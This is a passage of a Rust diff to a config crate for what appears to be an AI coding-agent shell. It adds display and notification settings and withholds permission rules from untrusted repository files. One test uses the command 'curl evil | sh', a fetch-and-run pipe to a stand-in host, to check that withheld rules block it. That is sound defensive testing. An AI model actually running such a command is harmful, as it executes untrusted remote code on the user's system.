@@ -49,11 +49,54 @@
 //! theme = "neo"
 //! ```
 //!
-//! The desktop behind the panes moves while a turn is running; a config
-//! turns that off with
+//! and how a session is titled — by the model, from what its first prompt
+//! asks, unless a file turns that off:
 //!
 //! ```toml
-//! effects = false
+//! titles = "first-prompt"
+//! ```
+//!
+//! and whether a new conversation asks the agent to keep its replies terse —
+//! code, commands, errors and security warnings left whole — which is off
+//! unless a file turns it on:
+//!
+//! ```toml
+//! terse = true
+//! ```
+//!
+//! and whether a new conversation asks the agent to state each decision it
+//! makes — what it chose, and what it left out — on a line of its own, which
+//! the shell lists as the agent's own account; on unless a file turns it off:
+//!
+//! ```toml
+//! decisions = false
+//! ```
+//!
+//! and whether a cargo command's output reaches the agent without cargo's
+//! progress and the tests that passed, the whole of it kept under `.niobe/` —
+//! off unless a file turns it on:
+//!
+//! ```toml
+//! trim = true
+//! ```
+//!
+//! and whether the shell rings the bell and sends a desktop notification
+//! when the agent waits on the operator or a turn ends, each on unless a file
+//! turns it off:
+//!
+//! ```toml
+//! [notify]
+//! bell = false
+//! notification = false
+//! ```
+//!
+//! and how long the operator is away before the first key back tells them
+//! what happened meanwhile, and whether it does of itself:
+//!
+//! ```toml
+//! [catch_up]
+//! after = 10
+//! automatic = false
 //! ```
 //!
 //! Which palettes there are is the shell's business, not this crate's, so the
@@ -99,15 +142,25 @@ mod write;
 use std::collections::BTreeMap;
 use std::path::{Path, PathBuf};
 
+use niobe_core::keys::Keymap;
 use niobe_core::permission::Allowlist;
 use niobe_core::{Backend, Billing};
 
 pub use error::ConfigError;
-pub use write::remember;
+pub use write::{Remembered, remember};
 
 /// The file name of a config, in the user's config directory and in a
 /// repository's `.niobe` directory alike.
 pub const FILE_NAME: &str = "config.toml";
+
+/// The name of the profile a session runs under where no config file exists
+/// anywhere: see [`Config::implied`].
+pub const IMPLIED_PROFILE: &str = "claude";
+
+/// The file that says what [`Config::implied`] is, in the words a config is
+/// written in, so that making it explicit is a copy.
+pub const IMPLIED_FILE: &str =
+    "default_profile = \"claude\"\n[profiles.claude]\nbackend = \"claude\"\n";
 
 /// What a profile lost because the file it came from has not been trusted
 /// (see [`trust`]).
@@ -194,9 +247,10 @@ impl Profile {
         &self.args
     }
 
-    /// The models this profile offers, in the order the shell lists them for
-    /// picking. Empty where the config names none, which is a profile whose
-    /// model is whatever the backend chooses: Niobe never invents a model id.
+    /// The models this profile narrows the shell's model list to, in the
+    /// order it lists them. Empty where the config names none, which is a
+    /// profile offered every model its backend lists: Niobe never invents a
+    /// model id.
     pub fn models(&self) -> &[String] {
         &self.models
     }
@@ -227,6 +281,11 @@ impl Profile {
 
     /// A shell command that renews the backend's credentials when they have
     /// expired, such as a single sign-on login. Never empty when present.
+    ///
+    /// Read, gated on trust and listed, and not run yet: nothing tells a
+    /// backend whose credentials expired from one that failed another way,
+    /// which is when it would run, and running a login before every session
+    /// would ask the operator to sign in each time.
     ///
     /// `None` for a profile from a file that has not been trusted.
     pub fn auth_refresh(&self) -> Option<&str> {
@@ -320,17 +379,130 @@ impl ThemeName {
     }
 }
 
+/// How a session gets the title its pane and the history dialog name it by.
+#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
+pub enum Titles {
+    /// The backend is asked for a few words on what the first prompt asks.
+    /// The `claude` CLI answers from its small model: 899 input tokens and 10
+    /// output for a short prompt, measured on Claude Code 2.1.292 with haiku,
+    /// and a few hundred more at most for a long one, since the bridge sends
+    /// only the prompt's first kilobyte. The CLI bills it into the session's
+    /// running totals and the bridge counts it with the next turn.
+    #[default]
+    Model,
+    /// The first line of the first prompt, as the shell did before the
+    /// backend was asked: no tokens spent on a title.
+    FirstPrompt,
+}
+
+impl Titles {
+    /// The value a config writes for it.
+    pub fn as_str(self) -> &'static str {
+        match self {
+            Self::Model => "model",
+            Self::FirstPrompt => "first-prompt",
+        }
+    }
+}
+
+/// Whether the shell calls the operator back when the agent waits on them or
+/// a turn they sent ends: the terminal's bell, and a desktop notification
+/// where the terminal shows one. Each is on unless a config turns it off.
+///
+/// ```toml
+/// [notify]
+/// bell = false
+/// notification = false
+/// ```
+#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
+pub struct Notify {
+    bell: Option<bool>,
+    notification: Option<bool>,
+}
+
+impl Notify {
+    /// Whether the bell rings.
+    pub fn bell(&self) -> bool {
+        self.bell.unwrap_or(true)
+    }
+
+    /// Whether a desktop notification is sent, where the terminal shows one.
+    pub fn notification(&self) -> bool {
+        self.notification.unwrap_or(true)
+    }
+
+    /// `over`'s switches where it sets them, and these elsewhere: a file that
+    /// says nothing of the bell leaves it as the file before it said.
+    fn overlay(self, over: Self) -> Self {
+        Self {
+            bell: over.bell.or(self.bell),
+            notification: over.notification.or(self.notification),
+        }
+    }
+}
+
+/// When the shell tells the operator what happened while they were away: the
+/// first key pressed after `after` minutes with none opens the catch-up,
+/// unless `automatic` is off, which leaves it to the View menu and `c`.
+///
+/// ```toml
+/// [catch_up]
+/// after = 10
+/// automatic = false
+/// ```
+#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
+pub struct CatchUp {
+    after: Option<u64>,
+    automatic: Option<bool>,
+}
+
+impl CatchUp {
+    /// How long with no key pressed is away, in minutes: five unless a
+    /// config says otherwise, and never under one.
+    pub fn after_minutes(&self) -> u64 {
+        self.after.unwrap_or(5)
+    }
+
+    /// Whether the first key back opens the catch-up of itself.
+    pub fn automatic(&self) -> bool {
+        self.automatic.unwrap_or(true)
+    }
+
+    /// `over`'s settings where it makes them, and these elsewhere.
+    fn overlay(self, over: Self) -> Self {
+        Self {
+            after: over.after.or(self.after),
+            automatic: over.automatic.or(self.automatic),
+        }
+    }
+}
+
 /// One config file, or several laid over one another.
 #[derive(Debug, Clone, Default, PartialEq, Eq)]
 pub struct Config {
     profiles: BTreeMap<String, Profile>,
     default_profile: Option<DefaultProfile>,
     theme: Option<ThemeName>,
-    effects: Option<bool>,
+    titles: Option<Titles>,
+    terse: Option<bool>,
+    decisions: Option<bool>,
+    trim: Option<bool>,
+    keys: Keymap,
+    notify: Notify,
+    catch_up: CatchUp,
     allowed: Allowlist,
     /// The `default_profile` of a file that has not been trusted, which is not
     /// in force.
     withheld_default: Option<DefaultProfile>,
+    /// The `[permissions]` rules of a file that has not been trusted, and that
+    /// file. They answer no prompt.
+    withheld_rules: Option<(Allowlist, PathBuf)>,
+    /// Whether a file that has not been trusted says `titles = "model"`,
+    /// which is not in force.
+    withheld_model_titles: bool,
+    /// The file this config's `[permissions]` rules were read from, where it
+    /// is one file that has some, which is what a withheld rule is named by.
+    rules_from: Option<PathBuf>,
     /// Whether this is a file that has not been trusted, as
     /// [`Config::untrusted`] leaves it.
     untrusted: bool,
@@ -369,7 +541,27 @@ impl Config {
     /// Parses the text of the config file at `path`. `path` is only used to
     /// say where a profile came from and where an error is.
     pub fn parse(text: &str, path: &Path) -> Result<Self, ConfigError> {
-        parse::config(text, path)
+        let mut config = parse::config(text, path)?;
+        if !config.allowed.is_empty() {
+            config.rules_from = Some(path.to_path_buf());
+        }
+        Ok(config)
+    }
+
+    /// The config a session runs on where no config file exists: one profile,
+    /// [`IMPLIED_PROFILE`], that runs the `claude` CLI found on `PATH` with
+    /// its own settings untouched, and is the default.
+    ///
+    /// It is a stand-in for a file and never an addition to one. A caller
+    /// uses it only where there is no file to read, so a file that exists
+    /// replaces it whole and nothing changes under an operator who has one.
+    pub fn implied() -> Self {
+        let source = Path::new("(implied: no config file)");
+        let mut config = Self::default();
+        if let Ok(parsed) = Self::parse(IMPLIED_FILE, source) {
+            config = parsed;
+        }
+        config
     }
 
     /// Reads and parses the config file at `path`. A file that does not exist
@@ -426,15 +618,37 @@ impl Config {
         if over.withheld_default.is_some() {
             self.withheld_default = over.withheld_default;
         }
+        if over.withheld_rules.is_some() {
+            self.withheld_rules = over.withheld_rules;
+        }
+        self.withheld_model_titles |= over.withheld_model_titles;
+        self.rules_from = None;
         if over.theme.is_some() {
             self.theme = over.theme;
         }
-        if over.effects.is_some() {
-            self.effects = over.effects;
+        if over.titles.is_some() {
+            self.titles = over.titles;
         }
+        if over.terse.is_some() {
+            self.terse = over.terse;
+        }
+        if over.decisions.is_some() {
+            self.decisions = over.decisions;
+        }
+        if over.trim.is_some() {
+            self.trim = over.trim;
+        }
+        // A file that rebinds keys says what every rebound key is: bindings
+        // laid together could put one key on two actions, so the later file's
+        // table replaces the earlier one whole.
+        if !over.keys.is_empty() {
+            self.keys = over.keys;
+        }
+        self.notify = self.notify.overlay(over.notify);
+        self.catch_up = self.catch_up.overlay(over.catch_up);
         // Permissions add up rather than replacing one another: a rule is a
         // permission the operator granted, and a repository's file is not
-        // where one is taken back.
+        // where one is taken back. An untrusted file has none left to add.
         self.allowed = self.allowed.merge(over.allowed);
         self
     }
@@ -442,9 +656,15 @@ impl Config {
     /// This config as it applies while the file it came from has not been
     /// trusted: every profile keeps its backend and the models it offers, and
     /// loses its `env`, its `args`, its `settings`, its `auth_refresh` and
-    /// what it says about billing; the `default_profile` is not in force; and
-    /// laid over another config it adds profiles without replacing any (see
-    /// [`trust`] and [`Config::overlay`]).
+    /// what it says about billing; the `default_profile` is not in force;
+    /// its `[permissions]` rules answer no prompt; a `titles = "model"` does
+    /// not turn the model's titles on; and laid over another
+    /// config it adds profiles without replacing any (see [`trust`] and
+    /// [`Config::overlay`]).
+    ///
+    /// The rules are withheld for the reason the rest is: a file that arrived
+    /// with a clone is one nobody here has read, and `allow = ["Bash"]` in it
+    /// would run every command the agent chose without a question.
     ///
     /// Applied to the layer, before it is laid over anything, so that a
     /// profile the repository defines cannot end up holding half of the
@@ -456,6 +676,17 @@ impl Config {
         }
         if let Some(default) = self.default_profile.take() {
             self.withheld_default = Some(default);
+        }
+        if !self.allowed.is_empty() {
+            let rules = std::mem::take(&mut self.allowed);
+            let from = self.rules_from.clone().unwrap_or_default();
+            self.withheld_rules = Some((rules, from));
+        }
+        // Asking the model for a title spends the operator's tokens, which a
+        // file nobody has read does not decide; turning it off spends nothing.
+        if self.titles == Some(Titles::Model) {
+            self.titles = None;
+            self.withheld_model_titles = true;
         }
         self.untrusted = true;
         self
@@ -471,6 +702,17 @@ impl Config {
         self.profiles.values().any(Profile::needs_trust)
             || self.default_profile.is_some()
             || self.withheld_default.is_some()
+            || !self.allowed.is_empty()
+            || self.withheld_rules.is_some()
+            || self.titles == Some(Titles::Model)
+            || self.withheld_model_titles
+    }
+
+    /// Whether a file that has not been trusted says `titles = "model"`, which
+    /// it may not turn on: asking the model for a title spends the operator's
+    /// tokens on every new session.
+    pub fn withholds_model_titles(&self) -> bool {
+        self.withheld_model_titles
     }
 
     /// Whether `over` defines a profile this config defines too, which it
@@ -490,8 +732,16 @@ impl Config {
             .map(|default| (default.name.as_str(), default.path.as_path()))
     }
 
-    /// The standing answers to permission prompts, from every file laid over
-    /// the ones before it.
+    /// The `[permissions]` rules a file that has not been trusted sets, and
+    /// that file, where one does. They are not in force.
+    pub fn withheld_rules(&self) -> Option<(&Allowlist, &Path)> {
+        self.withheld_rules
+            .as_ref()
+            .map(|(rules, path)| (rules, path.as_path()))
+    }
+
+    /// The standing answers to permission prompts, from every trusted file
+    /// laid over the ones before it.
     pub fn allowed(&self) -> &Allowlist {
         &self.allowed
     }
@@ -510,13 +760,67 @@ impl Config {
         self.theme.as_ref()
     }
 
-    /// Whether the desktop behind the panes moves while a turn is running:
-    /// on unless a config turns it off with `effects = false`.
+    /// The keys the F-key bar's actions were given instead of their own.
     ///
-    /// Not gated on trust, for the reason [`Config::theme`] is not: it
-    /// changes what the shell draws and nothing a backend is started with.
-    pub fn effects(&self) -> bool {
-        self.effects.unwrap_or(true)
+    /// Not gated on trust: a key is nothing a backend is started with, and a
+    /// repository that rebinds one has moved a key of the shell's.
+    pub fn keys(&self) -> &Keymap {
+        &self.keys
+    }
+
+    /// Whether the shell calls the operator back, and how.
+    ///
+    /// Not gated on trust: a bell is nothing a backend is started with, and a
+    /// repository that turns one off or on has changed what the shell sends
+    /// the terminal it draws on and no more.
+    pub fn notify(&self) -> Notify {
+        self.notify
+    }
+
+    /// When the shell tells the operator what happened while they were away.
+    ///
+    /// Not gated on trust, for the reason [`Config::notify`] is not: it
+    /// changes what the shell draws, and nothing a backend is started with.
+    pub fn catch_up(&self) -> CatchUp {
+        self.catch_up
+    }
+
+    /// How a session is titled: by the model unless a config says
+    /// `titles = "first-prompt"`. A file that has not been trusted can turn
+    /// the model's titles off and cannot turn them on ([`Config::untrusted`]).
+    pub fn titles(&self) -> Titles {
+        self.titles.unwrap_or_default()
+    }
+
+    /// Whether a new conversation asks the agent for terse replies, which is
+    /// off unless a config says `terse = true`.
+    ///
+    /// Not gated on trust: what it puts in front of a backend is an
+    /// instruction Niobe wrote and the file only switches, which shortens
+    /// replies and lets nothing a repository wrote reach the backend.
+    pub fn terse(&self) -> bool {
+        self.terse.unwrap_or(false)
+    }
+
+    /// Whether a new conversation asks the agent to state the decisions it
+    /// makes, each on a line of its own, which is on unless a config says
+    /// `decisions = false`.
+    ///
+    /// Not gated on trust, for the reason [`Config::terse`] is not: the words
+    /// it puts in front of a backend are Niobe's own, and the file only
+    /// switches them.
+    pub fn decisions(&self) -> bool {
+        self.decisions.unwrap_or(true)
+    }
+
+    /// Whether the agent reads a cargo command's output trimmed, which is off
+    /// unless a config says `trim = true`.
+    ///
+    /// Not gated on trust, for the reason [`Config::terse`] is not: what it
+    /// puts in front of a backend is a hook that runs Niobe's own binary,
+    /// which leaves lines out of what the agent reads and keeps all of it.
+    pub fn trim(&self) -> bool {
+        self.trim.unwrap_or(false)
     }
 
     /// The profile a session runs under: the one `requested` names, or else
@@ -554,6 +858,7 @@ impl Config {
 #[cfg(test)]
 mod tests {
     use super::*;
+    use niobe_core::permission::Rule;
 
     fn path(name: &str) -> PathBuf {
         PathBuf::from(format!("/configs/{name}/config.toml"))
@@ -587,6 +892,98 @@ args = ["--model", "gpt-4"]
 "#;
 
     #[test]
+    fn a_keys_table_rebinds_the_bars_actions_and_is_laid_over_by_a_later_file() {
+        use niobe_core::keys::{Bindable, Chord};
+        let user = parsed("[keys]\nmcp = \"F11\"\nmemory = \"ctrl+s\"\n");
+
+        assert_eq!(user.keys().chord_of(Bindable::Mcp), Some(Chord::F(11)));
+        assert_eq!(
+            user.keys().chord_of(Bindable::Memory),
+            Some(Chord::Ctrl('s'))
+        );
+        assert_eq!(user.keys().chord_of(Bindable::Help), None);
+
+        let repository =
+            Config::parse("[keys]\nmcp = \"F12\"\n", &path("repo")).expect("the config is valid");
+        let laid = user.overlay(repository);
+        assert_eq!(laid.keys().chord_of(Bindable::Mcp), Some(Chord::F(12)));
+        assert_eq!(
+            laid.keys().chord_of(Bindable::Memory),
+            None,
+            "a file that rebinds keys says what every rebound key is"
+        );
+    }
+
+    #[test]
+    fn rebinding_a_key_needs_no_trust_and_an_untrusted_file_keeps_its_keys() {
+        use niobe_core::keys::{Bindable, Chord};
+        let config = parsed("[keys]\nmcp = \"F11\"\n");
+
+        assert!(!config.needs_trust());
+        assert_eq!(
+            config.untrusted().keys().chord_of(Bindable::Mcp),
+            Some(Chord::F(11))
+        );
+    }
+
+    #[test]
+    fn a_binding_that_cannot_be_made_is_reported_at_its_key_and_its_line() {
+        assert_eq!(
+            invalid("[keys]\nmpc = \"F11\"\n"),
+            "/configs/user/config.toml:2: keys.mpc: unknown action; expected help, compact, \
+             clear, model, diff, rewind, mcp, memory, settings, quit"
+        );
+        let bad = invalid("[keys]\nmcp = \"ctrl+c\"\n");
+        assert!(
+            bad.starts_with("/configs/user/config.toml:2: keys.mcp: "),
+            "{bad}"
+        );
+        assert!(bad.contains("F1 to F12"), "{bad}");
+        let same = invalid("[keys]\nmcp = \"F11\"\nmemory = \"F11\"\n");
+        assert!(
+            same.starts_with("/configs/user/config.toml:3: keys.memory: "),
+            "{same}"
+        );
+        let takes = invalid("[keys]\nmcp = \"F8\"\n");
+        assert!(
+            takes.starts_with("/configs/user/config.toml:2: keys.mcp: "),
+            "{takes}"
+        );
+        assert!(takes.contains("memory"), "{takes}");
+    }
+
+    #[test]
+    fn the_implied_config_selects_a_claude_profile_with_nothing_set() {
+        let config = Config::implied();
+
+        let selected = config
+            .select(None)
+            .expect("the implied default names a profile it defines")
+            .expect("the implied config selects one");
+        assert_eq!(selected.name, IMPLIED_PROFILE);
+        assert_eq!(selected.profile.backend(), Backend::Claude);
+        assert!(selected.profile.env().is_empty());
+        assert!(selected.profile.args().is_empty());
+        assert!(selected.profile.settings().is_none());
+        assert!(selected.profile.auth_refresh().is_none());
+        assert!(config.allowed().is_empty());
+    }
+
+    #[test]
+    fn the_file_that_makes_the_implied_profile_explicit_parses_to_the_same_profile() {
+        let written = parsed(IMPLIED_FILE);
+
+        assert_eq!(
+            written.select(None).expect("valid").map(|s| s.name),
+            Some(IMPLIED_PROFILE)
+        );
+        assert_eq!(
+            written.profiles().keys().collect::<Vec<_>>(),
+            Config::implied().profiles().keys().collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
     fn a_profile_is_a_backend_plus_an_environment_arguments_and_a_refresh_command() {
         let config = parsed(EXAMPLE);
 
@@ -617,6 +1014,23 @@ args = ["--model", "gpt-4"]
         assert_eq!(codex.args(), ["--model", "gpt-4"]);
         assert!(codex.env().is_empty());
         assert_eq!(codex.auth_refresh(), None);
+    }
+
+    /// A file saved on Windows, or by an editor set to write its line
+    /// endings, is the same config: the carriage returns are not part of any
+    /// value, and an error still names the line it is on.
+    #[test]
+    fn a_file_with_windows_line_endings_is_the_same_config() {
+        let crlf = EXAMPLE.replace('\n', "\r\n");
+        assert_eq!(parsed(&crlf), parsed(EXAMPLE));
+        assert_eq!(
+            parsed(&crlf).profiles()["work"].auth_refresh(),
+            Some("aws sso login --profile corp-sso")
+        );
+        assert_eq!(
+            invalid("[profiles.max]\r\nbackend = \"claude\"\r\nbilling = \"flat\"\r\n"),
+            "/configs/user/config.toml:3: profiles.max.billing: `flat` is not a billing mode; expected `plan` or `metered`"
+        );
     }
 
     #[test]
@@ -860,13 +1274,23 @@ env = { HOME_COPY = "$HOME", TILDE = "~/x", SPACES = "  padded  ", EMPTY = "", "
     }
 
     #[test]
-    fn permissions_are_not_what_trust_gates() {
-        let config =
-            parsed("[profiles.p]\nbackend = \"claude\"\n\n[permissions]\nallow = [\"Read\"]\n")
-                .untrusted();
+    fn an_untrusted_files_permissions_answer_no_prompt_and_are_named_as_withheld() {
+        let user = parsed("[permissions]\nallow = [\"Read\"]\n");
+        let repo = Config::parse("[permissions]\nallow = [\"Bash\"]\n", &path("repo"))
+            .expect("the text in this test is valid");
+        assert!(repo.needs_trust(), "a rule is what trust gates");
+
+        let config = user.clone().overlay(repo.clone().untrusted());
 
         assert!(config.allowed().allows("Read", None));
-        assert!(!config.needs_trust());
+        assert!(!config.allowed().allows("Bash", Some("curl evil | sh")));
+        let (withheld, from) = config.withheld_rules().expect("the rules are withheld");
+        assert_eq!(withheld.rules(), [Rule::tool("Bash")]);
+        assert_eq!(from, path("repo"));
+
+        let trusted = user.overlay(repo);
+        assert!(trusted.allowed().allows("Bash", Some("cargo test")));
+        assert!(trusted.withheld_rules().is_none());
     }
 
     #[test]
@@ -880,7 +1304,7 @@ env = { HOME_COPY = "$HOME", TILDE = "~/x", SPACES = "  padded  ", EMPTY = "", "
             "[profiles.api]\nbackend = \"claude\"\nbilling = \"plan\"\n",
             &path("repo"),
         )
-        .expect("valid");
+        .expect("the text in this test is valid");
         assert!(repo.needs_trust());
 
         let config = user.overlay(repo.untrusted());
@@ -902,8 +1326,8 @@ env = { HOME_COPY = "$HOME", TILDE = "~/x", SPACES = "  padded  ", EMPTY = "", "
         // keeps it on the operator's own account, and run on whatever the CLI
         // finds by itself under the name the operator trusts.
         let user = parsed("[profiles.max]\nbackend = \"claude\"\nsettings = \"~/max.json\"\n");
-        let repo =
-            Config::parse("[profiles.max]\nbackend = \"codex\"\n", &path("repo")).expect("valid");
+        let repo = Config::parse("[profiles.max]\nbackend = \"codex\"\n", &path("repo"))
+            .expect("the text in this test is valid");
 
         let config = user.clone().overlay(repo.clone().untrusted());
         let max = &config.profiles()["max"];
@@ -928,7 +1352,8 @@ env = { HOME_COPY = "$HOME", TILDE = "~/x", SPACES = "  padded  ", EMPTY = "", "
             "default_profile = \"max\"\n[profiles.max]\nbackend = \"claude\"\n\
              [profiles.api]\nbackend = \"claude\"\n",
         );
-        let repo = Config::parse("\ndefault_profile = \"api\"\n", &path("repo")).expect("valid");
+        let repo = Config::parse("\ndefault_profile = \"api\"\n", &path("repo"))
+            .expect("the text in this test is valid");
         assert!(repo.needs_trust());
 
         let untrusted = repo.clone().untrusted();
@@ -936,7 +1361,10 @@ env = { HOME_COPY = "$HOME", TILDE = "~/x", SPACES = "  padded  ", EMPTY = "", "
         let config = user.clone().overlay(untrusted);
 
         assert_eq!(
-            config.select(None).expect("valid").map(|s| s.name),
+            config
+                .select(None)
+                .expect("the text in this test is valid")
+                .map(|s| s.name),
             Some("max")
         );
         assert_eq!(
@@ -946,7 +1374,10 @@ env = { HOME_COPY = "$HOME", TILDE = "~/x", SPACES = "  padded  ", EMPTY = "", "
 
         let trusted = user.overlay(repo);
         assert_eq!(
-            trusted.select(None).expect("valid").map(|s| s.name),
+            trusted
+                .select(None)
+                .expect("the text in this test is valid")
+                .map(|s| s.name),
             Some("api")
         );
         assert_eq!(trusted.withheld_default(), None);
@@ -962,13 +1393,21 @@ env = { HOME_COPY = "$HOME", TILDE = "~/x", SPACES = "  padded  ", EMPTY = "", "
     }
 
     #[test]
+    fn a_rule_copied_from_claude_code_is_reported_at_its_line_with_the_form_to_write() {
+        let said = invalid("[permissions]\nallow = [\n  \"Read\",\n  \"Bash(git status:*)\",\n]\n");
+
+        assert!(said.starts_with("/configs/user/config.toml:4:"), "{said}");
+        assert!(said.contains("write `Bash(git status *)`"), "{said}");
+    }
+
+    #[test]
     fn a_config_with_no_permissions_allows_nothing_by_itself() {
         assert!(parsed(EXAMPLE).allowed().is_empty());
     }
 
     #[test]
     fn repo_config_overrides_user_config() {
-        let user = Config::parse(EXAMPLE, &path("user")).expect("valid");
+        let user = Config::parse(EXAMPLE, &path("user")).expect("the text in this test is valid");
         let repo = Config::parse(
             r#"
 default_profile = "work"
@@ -978,7 +1417,7 @@ backend = "codex"
 "#,
             &path("repo"),
         )
-        .expect("valid");
+        .expect("the text in this test is valid");
 
         let config = user.overlay(repo);
 
@@ -990,7 +1429,10 @@ backend = "codex"
             "a profile the repo defines replaces the user's whole, env included"
         );
         assert_eq!(config.profiles()["personal"].source(), path("user"));
-        let selected = config.select(None).expect("valid").expect("a default");
+        let selected = config
+            .select(None)
+            .expect("the text in this test is valid")
+            .expect("a default");
         assert_eq!(selected.name, "work");
     }
 
@@ -998,12 +1440,15 @@ backend = "codex"
     fn a_layer_without_a_default_keeps_the_one_beneath_it() {
         let user = parsed(EXAMPLE);
         let repo = Config::parse("[profiles.extra]\nbackend = \"native\"\n", &path("repo"))
-            .expect("valid");
+            .expect("the text in this test is valid");
 
         let config = user.overlay(repo);
 
         assert_eq!(
-            config.select(None).expect("valid").map(|s| s.name),
+            config
+                .select(None)
+                .expect("the text in this test is valid")
+                .map(|s| s.name),
             Some("personal")
         );
         assert_eq!(config.profiles().len(), 4);
@@ -1014,8 +1459,8 @@ backend = "codex"
         let config = parsed(EXAMPLE);
         let selected = config
             .select(Some("work"))
-            .expect("valid")
-            .expect("selected");
+            .expect("the text in this test is valid")
+            .expect("the profile the test names is defined");
         assert_eq!(selected.name, "work");
         assert_eq!(selected.profile, &config.profiles()["work"]);
     }
@@ -1023,8 +1468,16 @@ backend = "codex"
     #[test]
     fn without_a_request_or_a_default_no_profile_is_selected() {
         let config = parsed("[profiles.only]\nbackend = \"claude\"\n");
-        assert_eq!(config.select(None).expect("valid"), None);
-        assert_eq!(Config::default().select(None).expect("valid"), None);
+        assert_eq!(
+            config.select(None).expect("the text in this test is valid"),
+            None
+        );
+        assert_eq!(
+            Config::default()
+                .select(None)
+                .expect("the text in this test is valid"),
+            None
+        );
     }
 
     #[test]
@@ -1051,7 +1504,10 @@ backend = "codex"
     #[test]
     fn a_default_profile_that_is_not_defined_is_reported_where_it_was_set() {
         let config = parsed("\n\ndefault_profile = \"missing\"\n");
-        let error = config.select(None).expect_err("undefined").to_string();
+        let error = config
+            .select(None)
+            .expect_err("a default profile that is not defined is an error")
+            .to_string();
         assert_eq!(
             error,
             "/configs/user/config.toml:3: default_profile: names `missing`, which no config defines"
@@ -1075,26 +1531,13 @@ backend = "codex"
         assert_eq!(parsed("[profiles.p]\nbackend = \"claude\"\n").theme(), None);
     }
 
+    /// The shell had a switch for an animation it no longer draws; a file
+    /// that still sets it loads as though it did not.
     #[test]
-    fn the_desktop_moves_unless_a_config_turns_it_off_and_the_last_file_to_say_wins() {
-        assert!(parsed("[profiles.p]\nbackend = \"claude\"\n").effects());
-        let off = parsed("effects = false\n").untrusted();
-        assert!(!off.effects());
-        assert!(!off.needs_trust());
-
-        let on = Config::parse("effects = true\n", &path("repo")).expect("valid");
-        assert!(off.clone().overlay(on).effects());
-        let quiet = Config::parse("theme = \"neo\"\n", &path("repo")).expect("valid");
-        assert!(!off.overlay(quiet).effects());
-    }
-
-    #[test]
-    fn an_effects_switch_that_is_not_a_boolean_is_reported_at_its_line() {
-        let error = Config::parse("\neffects = \"off\"\n", &path("user"))
-            .expect_err("a string is not a switch");
-        let message = error.to_string();
-        assert!(message.contains(":2: effects:"), "{message}");
-        assert!(message.contains("a boolean"), "{message}");
+    fn a_config_that_still_sets_the_retired_effects_switch_loads() {
+        let config = parsed("theme = \"neo\"\neffects = false\n");
+        assert_eq!(config, parsed("theme = \"neo\"\n"));
+        assert!(!config.needs_trust());
     }
 
     #[test]
@@ -1105,17 +1548,198 @@ backend = "codex"
         assert_eq!(user.theme().map(ThemeName::name), Some("classic"));
         assert!(!user.needs_trust());
 
-        let repo = Config::parse("theme = \"neo\"\n", &path("repo")).expect("valid");
+        let repo = Config::parse("theme = \"neo\"\n", &path("repo"))
+            .expect("the text in this test is valid");
         let config = user.clone().overlay(repo);
         assert_eq!(config.theme().map(ThemeName::name), Some("neo"));
 
         // A file that names none leaves the one before it standing.
-        let quiet =
-            Config::parse("[profiles.p]\nbackend = \"claude\"\n", &path("repo")).expect("valid");
+        let quiet = Config::parse("[profiles.p]\nbackend = \"claude\"\n", &path("repo"))
+            .expect("the text in this test is valid");
         assert_eq!(
             user.overlay(quiet).theme().map(ThemeName::name),
             Some("classic")
         );
+    }
+
+    #[test]
+    fn a_session_is_titled_by_the_model_unless_a_config_says_first_prompt() {
+        assert_eq!(parsed("").titles(), Titles::Model);
+        assert_eq!(
+            parsed("titles = \"first-prompt\"\n").titles(),
+            Titles::FirstPrompt
+        );
+        assert_eq!(parsed("titles = \"model\"\n").titles(), Titles::Model);
+        assert_eq!(
+            invalid("\ntitles = \"haiku\"\n"),
+            "/configs/user/config.toml:2: titles: `haiku` is not a way to title a session; \
+             expected `model` or `first-prompt`"
+        );
+    }
+
+    #[test]
+    fn the_bell_and_the_notification_are_on_until_a_config_turns_them_off() {
+        let none = parsed("");
+        assert!(none.notify().bell() && none.notify().notification());
+
+        let quiet = parsed("[notify]\nbell = false\n");
+        assert!(!quiet.notify().bell());
+        assert!(quiet.notify().notification());
+
+        let repo = Config::parse("[notify]\nnotification = false\n", &path("repo"))
+            .expect("the config is valid")
+            .untrusted();
+        let laid = quiet.overlay(repo);
+        assert!(
+            !laid.notify().bell(),
+            "a file silent on the bell turned it on"
+        );
+        assert!(!laid.notify().notification());
+        assert!(!laid.needs_trust(), "a switch for the bell is not gated");
+    }
+
+    #[test]
+    fn the_catch_up_comes_of_itself_after_five_minutes_until_a_config_says_otherwise() {
+        let none = parsed("");
+        assert_eq!(
+            (none.catch_up().after_minutes(), none.catch_up().automatic()),
+            (5, true)
+        );
+
+        let longer = parsed("[catch_up]\nafter = 20\n");
+        let repo = Config::parse("[catch_up]\nautomatic = false\n", &path("repo"))
+            .expect("the config is valid")
+            .untrusted();
+        let laid = longer.overlay(repo);
+        assert_eq!(
+            (laid.catch_up().after_minutes(), laid.catch_up().automatic()),
+            (20, false),
+            "a file silent on how long kept the one before it"
+        );
+        assert!(!laid.needs_trust(), "the catch-up is not gated");
+    }
+
+    #[test]
+    fn a_catch_up_after_no_time_or_not_in_minutes_is_refused_at_its_line() {
+        assert_eq!(
+            invalid("[catch_up]\nafter = 0\n"),
+            "/configs/user/config.toml:2: catch_up.after: expected one minute or more"
+        );
+        assert_eq!(
+            invalid("[catch_up]\nafter = -3\n"),
+            "/configs/user/config.toml:2: catch_up.after: expected one minute or more"
+        );
+        assert_eq!(
+            invalid("[catch_up]\nafter = \"5m\"\n"),
+            "/configs/user/config.toml:2: catch_up.after: expected a whole number of \
+             minutes, found a string"
+        );
+        assert_eq!(
+            invalid("[catch_up]\nwhen = 5\n"),
+            "/configs/user/config.toml:2: catch_up.when: unknown key; expected `after` or \
+             `automatic`"
+        );
+    }
+
+    #[test]
+    fn a_notify_switch_that_is_not_a_boolean_or_not_a_switch_is_refused_at_its_line() {
+        assert_eq!(
+            invalid("[notify]\nbell = \"off\"\n"),
+            "/configs/user/config.toml:2: notify.bell: expected a boolean, found a string"
+        );
+        assert_eq!(
+            invalid("[notify]\n\nsound = false\n"),
+            "/configs/user/config.toml:3: notify.sound: unknown key; expected `bell` or \
+             `notification`"
+        );
+    }
+
+    #[test]
+    fn decisions_are_asked_for_until_a_file_turns_them_off_and_the_later_file_wins() {
+        assert!(parsed("").decisions());
+        assert!(!parsed("decisions = false\n").decisions());
+        let repo = Config::parse("decisions = true\n", &path("repo"))
